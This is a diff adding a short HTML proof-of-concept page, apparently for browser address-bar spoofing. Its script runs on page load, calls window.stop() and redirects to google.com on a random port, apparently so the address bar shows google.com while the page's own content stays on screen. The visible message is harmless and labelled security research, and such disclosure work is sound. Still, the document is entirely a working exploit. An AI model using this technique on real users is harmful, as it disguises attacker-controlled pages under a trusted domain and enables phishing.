@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Address Bar Spoofing – PoC</title>
+
+<style>
+    body {
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        background: linear-gradient(135deg, #f5f7fa, #e4e7eb);
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #222;
+    }
+
+    .card {
+        background: #ffffff;
+        padding: 28px 32px;
+        max-width: 460px;
+        border-radius: 14px;
+        box-shadow: 0 12px 30px rgba(0,0,0,0.12);
+        text-align: center;
+    }
+
+    .icon {
+        font-size: 36px;
+        margin-bottom: 12px;
+    }
+
+    h1 {
+        font-size: 18px;
+        margin: 0 0 10px 0;
+        font-weight: 600;
+    }
+
+    p {
+        font-size: 14px;
+        line-height: 1.6;
+        margin: 0;
+        color: #444;
+    }
+
+    .note {
+        margin-top: 14px;
+        font-size: 12px;
+        color: #777;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <div class="icon">⚠️</div>
+    <h1>Hi, your address bar has been spoofed</h1>
+    <div class="note">
+        Proof of Concept — Security Research Only
+    </div>
+</div>
+
+<script>
+    function spoof() {
+        setTimeout(() => {
+            window.stop();
+            let randomPort;
+            do {
+                randomPort = Math.floor(Math.random() * 1000);
+            } while (randomPort === 0 || randomPort === 443);
+            document.location = "https://google.com:" + randomPort + "/";
+        }, 300);
+    }
+    spoof();
+</script>
+
+</body>
+</html>
